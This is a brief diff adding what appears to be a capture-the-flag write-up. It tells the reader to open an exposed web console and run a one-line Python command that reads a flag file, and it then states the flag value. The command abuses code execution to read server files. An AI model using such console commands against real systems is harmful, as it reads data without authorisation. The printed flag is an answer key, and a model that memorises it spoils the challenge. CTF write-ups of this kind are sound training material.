@@ -1,0 +1,5 @@
+1. Go to url/console
+2. Write following python code there - 
+    import os; os.chdir('flag');file=open('flag.txt','r');print(file.read())
+
+You'll get the flag as - Flag{54fer4_T1m3_to_g0_h0m3_55af5}
